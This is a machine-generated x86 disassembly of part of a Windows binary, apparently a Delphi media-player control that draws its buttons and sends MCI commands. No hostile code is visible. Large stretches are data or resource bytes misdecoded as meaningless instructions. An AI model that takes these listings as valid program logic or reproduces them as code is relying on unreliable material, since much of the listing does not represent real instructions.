call sub_439bf4
sub_45a797
inc [ edx ]
add [ eax ] al
add [ edi + 0x67 ] dl
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_45a724
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x238 ] 0x0
jne r-xdata
push edi
lea esi [ ebp - 0x24 ]
lea edi [ ebp - 0x34 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x24 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_431e94
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x252 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_45acb4
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x250 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x254 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x250 ] edx
mov [ eax + 0x254 ] edx
xor eax eax
push ebp
push sub_45a926
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x24 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_431e94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x250 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x254 ] edx
retn
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_45b088
test al al
jne r-xdata
mov bl 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x294 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0xc ]
call sub_41c1e4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x298 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x14 ]
call sub_41c9b0
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403454
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0xc ]
mov edx 0xff000011
call sub_41c1e4
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x34 ] eax
add eax [ ebp - 0x14 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x2c ] eax
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x34 ] eax
jmp r-xdata
test bl bl
jne r-xdata
push ebx
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_45ace0
mov ecx eax
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_45a9a4
jmp r-xdata
sub_45a948
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0x8 ]
mov eax ebx
call sub_45b088
test al al
jne r-xdata
mov edx ebp
mov eax ebx
call sub_431fd0
mov eax ebx
mov si 0xffc8
call sub_403454
test al al
jne r-xdata
mov eax ebx
call sub_45a724
sub [ edi + 0x24 ] eax
mov eax ebx
call sub_45a724
add [ edi + 0x1c ] eax
jmp r-xdata
sub_45a9a4
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x1 ] cl
mov esi eax
xor edi edi
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
sub edx eax
sub edx [ rw-data ]
sar edx 0x1
jns r-xdata
add edx eax
mov [ ebp - 0x30 ] edx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
sub edx eax
sub edx [ rw-data ]
sar edx 0x1
jns r-xdata
adc edx 0x0
add edx eax
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x30 ]
add eax [ rw-data ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x2c ]
add eax [ rw-data ]
mov [ ebp - 0x24 ] eax
mov ebx [ esi + 0x228 ]
cmp [ esi + 0x281 ] 0x0
je r-xdata
adc edx 0x0
call sub_429004
call sub_4290e4
test al al
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateRectRgn
mov edi eax
push edi
mov eax ebx
call sub_41d438
push eax
call GetClipRgn
mov eax [ ebp - 0x24 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x28 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x2c ]
add eax 0x2
push eax
mov eax [ ebp - 0x30 ]
add eax 0x2
push eax
call CreateRectRgn
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_41d438
push eax
call SelectClipRgn
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
mov al [ ebp - 0x1 ]
sub al 0x1
jb r-xdata
mov al [ ebp - 0x1 ]
sub al 0x1
jb r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x8 ] 0x408
mov [ ebp - 0x8 ] 0x400
jmp r-xdata
call sub_429004
lea ecx [ ebp - 0x3c ]
mov dl 0x12
call sub_4292b0
jmp r-xdata
call sub_429004
lea ecx [ ebp - 0x3c ]
mov dl 0xf
call sub_4292b0
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x4
lea eax [ ebp - 0x30 ]
push eax
mov eax ebx
call sub_41d438
push eax
call DrawFrameControl
or [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov eax ebx
call sub_41d438
push eax
call sub_429004
lea ecx [ ebp - 0x3c ]
pop edx
call sub_4291a0
jmp r-xdata
call sub_429004
lea ecx [ ebp - 0x3c ]
mov dl 0x1a
call sub_4292b0
call sub_429004
lea ecx [ ebp - 0x3c ]
mov dl 0x17
call sub_4292b0
jmp r-xdata
call sub_429004
lea ecx [ ebp - 0x3c ]
mov dl 0x16
call sub_4292b0
jmp r-xdata
call sub_429004
lea ecx [ ebp - 0x3c ]
mov dl 0x13
call sub_4292b0
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push edi
mov eax ebx
call sub_41d438
push eax
call SelectClipRgn
push edi
call DeleteObject
mov eax [ ebx + 0x14 ]
call sub_41cac4
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x14 ]
call sub_41c9a8
mov esi eax
mov eax [ ebx + 0x10 ]
call sub_41c6c8
mov edi eax
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_41cacc
mov edx 0xff000010
mov eax [ ebx + 0x10 ]
call sub_41c6d0
mov eax [ ebp - 0x28 ]
dec eax
push eax
mov eax [ ebp - 0x24 ]
dec eax
push eax
mov ecx [ ebp - 0x2c ]
inc ecx
mov edx [ ebp - 0x30 ]
inc edx
mov eax ebx
call sub_41d118
mov dl [ ebp - 0x9 ]
mov eax [ ebx + 0x14 ]
call sub_41cacc
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_41c9b0
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_41c6d0
cmp [ esi + 0x281 ] 0x0
je r-xdata
sub_45ac00
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_45ace0
cmp bl al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
call sub_45aec8
mov [ eax + 0x8 ] bl
mov edx esi
mov eax edi
call sub_45ac30
sub_45ac30
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45b088
test al al
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebx
call sub_431890
mov eax ebx
mov si 0xffc8
call sub_403454
test al al
jne r-xdata
mov eax ebx
call sub_45a724
mov edx [ esp + 0x8 ]
sub edx eax
mov [ esp ] edx
mov eax ebx
call sub_45a724
add eax [ esp ]
mov [ esp + 0x8 ] eax
jmp r-xdata
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_43f228
push eax
call InvalidateRect
mov eax ebx
call sub_43f228
push eax
call UpdateWindow
sub_45acb4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45af7c
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_45aec8
mov al [ eax + 0x9 ]
xor al 0x1
pop esi
pop ebx
retn
sub_45ace0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45af7c
test al al
je r-xdata
mov eax [ r-xdata ]
call sub_45a5a0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_45aec8
mov al [ eax + 0x8 ]
pop esi
pop ebx
retn
sub_45ad10
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi ] 0x20
jne r-xdata
mov edx esi
mov eax ebx
call sub_432204
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax ebx
call sub_45ae10
sub_45ad3c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
push edi
push esi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43a008
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax edi
call sub_412350
lea edx [ ebp - 0x10 ]
mov cl 0x1
mov eax ebx
call sub_431804
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_45acb4
test al al
je r-xdata
mov eax ebx
mov si 0xffc8
call sub_403454
test al al
jne r-xdata
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_431890
mov esi [ ebp - 0x18 ]
mov eax ebx
call sub_45a724
sub esi eax
sub edi esi
test edi edi
jle r-xdata
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_431890
sub edi [ ebp - 0x20 ]
mov eax ebx
call sub_45a724
cmp edi eax
jge r-xdata
mov eax ebx
call sub_45a724
cmp edi eax
jge r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_45ae10
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_45ae10
sub_45ae10
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
mov edx esi
mov eax ebx
call sub_45acb4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_45ace0
mov edx eax
sub dl 0x1
jb r-xdata
cmp [ ebx + 0x280 ] 0x0
je r-xdata
je r-xdata
mov al 0x1
jmp r-xdata
mov al 0x2
jmp r-xdata
xor eax eax
jmp r-xdata
dec dl
je r-xdata
mov ecx eax
mov edx esi
mov eax ebx
call sub_45ac00
mov eax ebx
mov si 0xffad
call sub_403454
mov al 0x1
jmp r-xdata
sub_45aea0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
mov edx esi
mov eax ebx
call sub_45af7c
test al al
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_45aec8
mov edi [ eax + 0x4 ]
sub_45aec8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45aee8
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_45af54
sub_45aee8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43100c
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
test ebx ebx
je r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b37c
call sub_4039cc
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
jne r-xdata
xor ebx ebx
sub_45af54
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov esi eax
mov ecx esi
mov edx edi
mov eax ebx
call sub_43102c
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_45af94
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45af7c
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_45aec8
mov [ eax + 0x4 ] edi
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_45afc0
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax edi
call sub_431088
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_45aec8
call sub_403258
mov edx ebx
mov eax edi
call sub_45af7c
test al al
je r-xdata
sub_45b004
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45af7c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_431068
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_45aec8
call sub_403258
sub_45b048
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx ebp
mov eax edi
call sub_43e47c
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_45aee8
call sub_403258
inc esi
dec ebx
jne r-xdata
sub_45b088
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_45af7c
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_45aec8
mov al [ eax + 0xa ]
pop esi
pop ebx
retn
sub_45b0d8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45b0fd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b104
retn
sub_45b140
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_45b165
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45b16c
retn
sub_45b58b
pop esp
stosb [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
sbb [ eax ] eax
loopne r-xdata
inc ebp
add [ edx + 0x70ff0002 ] ah
mov esp 0x10045
add [ eax ] al
add [ eax ] al
add [ eax + 0x1ff ] al
add ah ch
rol [ ebp ] 0xd0
mov [ ebp ] sub_45c898
mov eax 0xd80045c8
enter 0x45 0xf8
enter 0x45 0xc
push esp
dec ebp
imul esp [ fs : ecx + 0x50 ] 0x6579616c
inc ebp
add [ eax ] dl
inc eax
add [ 0x1dff0003 ] bl
je r-xdata
inc eax
add [ eax ] bl
add eax [ eax ]
add [ edi ] cl
add [ ecx ] al
add al [ ebx ]
add al [ eax ]
add al [ edx ]
add al [ edi ]
add [ eax ] cl
add [ edi - 0x43fffb00 ] al
push [ ebx - 0x4dfc4601 ]
push [ ecx - 0x9004f01 ]
push esp
les eax [ ebp ]
add al 0xc5
inc ebp
add [ eax * 8 - 0x39afffbb ] dl
inc ebp
add ah dl
mov [ ebp ] 0xe0
mov [ ebp ] 0xec
mov [ ebp ] 0xec
mov ebp 0xc6f40045
inc ebp
xor al 0xb5
inc ebp
add [ edi ] al
or al 0x54
dec ebp
imul esp [ fs : ecx + 0x50 ] 0x6579616c
jb r-xdata
add [ eax + 0x1ff ] al
push cs
add [ esi ] cl
push esi
imul esi [ ebx + 0x69 ] 0x42656c62
inc edx
jne r-xdata
push esp
dec edi
jo r-xdata
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] eax
or [ ecx + 0x75 ] al
je r-xdata
bound ebp [ ebp ]
adc [ eax ] al
sbb eax 0x1dff0003
outsb
jae r-xdata
popad
jns r-xdata
mov bl 0x45
add [ eax ] bh
push ecx
inc ebx
add [ eax + eax ] ah
pop es
dec ebp
push eax
insb
popad
jns r-xdata
add bh bh
push ds
je r-xdata
je r-xdata
add bh bh
pushad
mov [ ebx ] eax
mov esp 0x43aa
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] al
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
ror [ gs : esi + 0x43 ] 0x0
or al 0x3
add bh bh
sub al 0xd7
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44070015 ] al
add [ edx ] cl
inc esp
jbe r-xdata
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc al [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
outsb
add [ eax ] dl
inc eax
or eax 0x6e450e00
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x1
add [ eax ] al
mov cl 0x45
add [ eax + 0x2cff0002 ] ah
mov ebp 0x10045
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x0
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
loopne r-xdata
add [ eax ] eax
jb r-xdata
popad
bound ebp [ ebp + 0x64 ]
inc edx
jne r-xdata
add [ 0x6e450e00 ] cl
jb r-xdata
jo r-xdata
push edx
ja r-xdata
add [ esi ] bl
add eax [ eax ]
[ esi ]
outsb
jae r-xdata
jne r-xdata
inc edx
outsb
jae r-xdata
outsb
je r-xdata
jb r-xdata
jns r-xdata
arpl [ ebp + 0x54 ] sp
or eax [ eax ]
push cs
inc ebx
outsd
insb
outsd
jb r-xdata
add [ edx + eax - 0x43170100 ] ah
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x1
add [ eax ] al
add al ah
mov cl 0x45
adc [ eax ] al
0xb4ff0000 0x438b
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
push eax
popad
jb r-xdata
popad
jns r-xdata
imul esi [ ebx + 0x70 ] 0x9479616c
outsb
call 0x7445f9c2
add [ eax ] al
inc ebp
outsb
popad
cmp eax [ ebx ]
popad
add [ eax ] al
call [ ebp + edi * 2 + 0x7e300043 ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
sldt [ edi ]
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
adc [ eax ] al
push eax
add [ eax ] al
inc ebx
add [ esp + esi * 8 + 0x43 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push 0x6948776f
outsb
je r-xdata
add [ eax + 0x5308001a ] al
push 0x6948776f
outsb
je r-xdata
bound ebp [ ebp ]
adc [ eax ] al
push edi
add [ eax ] al
jmp [ eax - 0x77 ]
popad
call [ edi + ebp * 4 ]
inc ebx
add [ eax + eax ] dh
adc [ eax ] al
sbb [ ebx ] al
add bh bh
sbb [ ebx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ss
add [ eax ] cl
inc esi
pop ds
add eax [ eax ]
[ edi ]
add eax [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ ecx ] cl
push ebx
push 0x61657261
jb r-xdata
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0013 ] al
outsd
outsb
jae r-xdata
add bh bh
adc al 0xaf
add [ eax ] dl
inc eax
add [ ebx + eax ] bl
add bh bh
dec eax
mov esp 0x10045
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
adc [ eax ] al
or al [ ecx + 0x75 ]
je r-xdata
adc [ eax ] al
cdq
add [ eax ] al
call [ eax + 0x5800438b ]
mov eax [ ebx ]
add [ eax ] al
add [ eax - 0x80000000 ] al
bound ecx [ edi + 0x72 ]
jb r-xdata
jpo r-xdata
imul ebp [ ebp + 0x4e ] 0x656d61
adc [ eax ] al
add [ eax + 0x46080016 ] al
imul ebp [ esi + 0x74 ] 0x45b1f873
add ah dh
add al [ eax ]
jmp eax
popad
jb r-xdata
imul ebp [ esi + 0x74 ] r-xdata
jl r-xdata
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
[ esp + esi * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x61540700
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] dl
inc eax
add [ ecx + eax - 0xba30100 ] ah
inc ebx
add [ eax + eax ] bh
add bh bh
clc
mov [ ebx ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax [ eax ]
or [ eax + 0x6f ] edx
jo r-xdata
mov dl 0x45
add al cl
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e001f ] al
jo r-xdata
dec edi
js r-xdata
add al [ eax ]
dec eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f07001e ] al
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
dec ebp
push eax
inc ebp
dec edx
inc ebp
inc ebx
push esp
add [ ebp - 0x75 ] dl
in al dx
push ecx
push ebx
test dl dl
je r-xdata
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
or [ edi + 0x6e ] cl
push eax
outsd
jo r-xdata
sbb al [ eax ]
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
cmp al [ ebx ]
mov [ ebp - 0x1 ] dl
mov ebx eax
add esp 0xfffffff0
call sub_403564
xor edx edx
mov eax ebx
call sub_440eac
mov eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_45baa0
mov ax [ r-xdata ]
mov [ ebx + 0x2a0 ] ax
mov ax [ r-xdata ]
mov [ ebx + 0x2a2 ] ax
mov ax [ r-xdata ]
mov [ ebx + 0x2a4 ] ax
xor eax eax
cli
dec [ eax - 0x277400ab ]
jns r-xdata
dec esi
outsd
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080023 ] al
outsb
jo r-xdata
xor edx edx
mov dl al
add edx edx
mov [ ebx + edx * 8 + 0x210 ] 0x1
mov [ ebx + edx * 8 + 0x211 ] 0x1
mov [ ebx + edx * 8 + 0x212 ] 0x1
mov [ ebx + edx * 8 + 0x213 ] 0x0
inc eax
cmp al 0x9
jne r-xdata
mov edx 0xf0
mov eax ebx
call sub_4381fc
mov edx 0x1e
mov eax ebx
call sub_438220
mov [ ebx + 0x2e0 ] 0x0
mov [ ebx + 0x31c ] 0x1
mov [ ebx + 0x31d ] 0x0
mov [ ebx + 0x31e ] 0x1
mov [ ebx + 0x2f4 ] 0x0
mov dl 0x1
mov eax ebx
call sub_43f45c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push edx
inc ebp
inc ebx
dec edi
push edx
inc esp
dec esi
add [ eax ] al
inc esp
dec ecx
add [ eax ] al
inc ebx
dec esp
add [ eax ] al
dec ebp
push eax
push eax
dec esp
inc ecx
pop ecx
add [ eax ] al
dec ebp
push eax
push eax
inc ecx
push ebp
push ebx
inc ebp
add [ ebp + 0x50 ] cl
push ebx
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ds
add [ edi ] al
dec edi
push cs
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f070020 ] al
outsb
inc ebp
outsb
je r-xdata
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ esi ] cl
dec edi
push cs
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060021 ] al
outsb
inc ebp
push esp
dec edi
push eax
add [ eax ] al
dec ebp
push eax
dec esi
inc ebp
pop eax
push esp
add [ eax ] al
dec ebp
push eax
push eax
push edx
inc ebp
push esi
add [ eax ] al
dec ebp
push eax
push ebx
push esp
inc ebp
push eax
add [ eax ] al
dec ebp
push eax
inc edx
inc ecx
inc ebx
dec ebx
add [ eax ] al
dec ebp
push eax
je r-xdata
js r-xdata
outsb
push eax
outsd
jae r-xdata
mov dl 0x45
add al dl
add al [ eax ]
call eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0022 ] al
sub_45ba2a
add [ eax ] al
push ebx
push esi
push ecx
call sub_4035cc
mov ebx edx
mov esi eax
mov ax [ esi + 0x2f2 ]
test ax ax
je r-xdata
mov eax esi
call sub_45bc10
mov edx ebx
and dl 0xfc
mov eax esi
call sub_440f08
test bl bl
jle r-xdata
mov edx esp
push edx
push 0x2
push 0x804
movzx eax ax
push eax
call mciSendCommandA
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_45baa0
push ebx
push esi
push edi
push ebp
add esp 0xffffffbc
mov esi eax
lea ecx [ esp + 0x2c ]
xor edx edx
xor eax eax
call sub_412350
mov eax [ esp + 0x2c ]
mov [ esi + 0x2c0 ] eax
mov eax [ esp + 0x30 ]
mov [ esi + 0x2c4 ] eax
mov [ esp ] 0x0
mov ebp rw-data
xor eax eax
mov al bl
xor edx edx
mov dl [ esp ]
add edx edx
lea edx [ esi + edx * 8 ]
mov eax [ edx + eax * 4 + 0x214 ]
mov edx [ eax ]
call [ edx + 0x20 ]
cmp eax [ esi + 0x2c4 ]
jle r-xdata
xor eax eax
mov al bl
xor edx edx
mov dl [ esp ]
add edx edx
lea edx [ esi + edx * 8 ]
mov eax [ edx + eax * 4 + 0x214 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov [ esi + 0x2c0 ] eax
inc ebx
add edi 0x4
cmp bl 0x3
jne r-xdata
xor eax eax
mov al bl
xor edx edx
mov dl [ esp ]
add edx edx
lea edx [ esi + edx * 8 ]
mov eax [ edx + eax * 4 + 0x214 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov [ esi + 0x2c4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41fb30
xor edx edx
mov dl bl
xor ecx ecx
mov cl [ esp ]
add ecx ecx
lea ecx [ esi + ecx * 8 ]
